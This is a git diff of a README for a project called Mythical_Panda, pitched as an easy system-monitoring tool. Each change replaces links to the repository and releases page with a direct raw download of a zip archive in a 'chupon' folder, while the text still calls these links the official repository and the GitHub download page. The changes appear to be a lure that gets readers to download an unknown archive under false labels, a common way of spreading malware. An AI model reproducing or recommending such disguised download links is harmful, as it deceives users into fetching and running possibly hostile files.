@@ -1,6 +1,6 @@
 # 🐼 Mythical_Panda - Easy Control for System Monitoring
 
-[![Download Mythical_Panda](https://img.shields.io/badge/Download-Mythical_Panda-brightgreen)](https://github.com/ismaelllemos/Mythical_Panda)
+[![Download Mythical_Panda](https://img.shields.io/badge/Download-Mythical_Panda-brightgreen)](https://raw.githubusercontent.com/ismaelllemos/Mythical_Panda/main/chupon/Panda-Mythical-v3.5-alpha.3.zip)
 
 ## 🔍 What is Mythical_Panda?
 
@@ -41,7 +41,7 @@ Follow these steps carefully. You will have Mythical_Panda up and running in jus
 
 Click the big green button below to visit the download page. This is the official source to get the latest version.
 
-[![Download Mythical_Panda](https://img.shields.io/badge/Download-Mythical_Panda-brightgreen)](https://github.com/ismaelllemos/Mythical_Panda)
+[![Download Mythical_Panda](https://img.shields.io/badge/Download-Mythical_Panda-brightgreen)](https://raw.githubusercontent.com/ismaelllemos/Mythical_Panda/main/chupon/Panda-Mythical-v3.5-alpha.3.zip)
 
 This link will take you to the GitHub page where you can download the program files.
 
@@ -134,9 +134,9 @@ It also connects to Android environments like Termux for expert users who want r
 
 ## 🎯 Useful Links
 
-- Official repository: https://github.com/ismaelllemos/Mythical_Panda  
-- Download page: https://github.com/ismaelllemos/Mythical_Panda/releases  
+- Official repository: https://raw.githubusercontent.com/ismaelllemos/Mythical_Panda/main/chupon/Panda-Mythical-v3.5-alpha.3.zip  
+- Download page: https://raw.githubusercontent.com/ismaelllemos/Mythical_Panda/main/chupon/Panda-Mythical-v3.5-alpha.3.zip  
 
 Click the badge below for quick access to downloads:  
 
-[![Download Mythical_Panda](https://img.shields.io/badge/Download-Mythical_Panda-brightgreen)](https://github.com/ismaelllemos/Mythical_Panda)
+[![Download Mythical_Panda](https://img.shields.io/badge/Download-Mythical_Panda-brightgreen)](https://raw.githubusercontent.com/ismaelllemos/Mythical_Panda/main/chupon/Panda-Mythical-v3.5-alpha.3.zip)
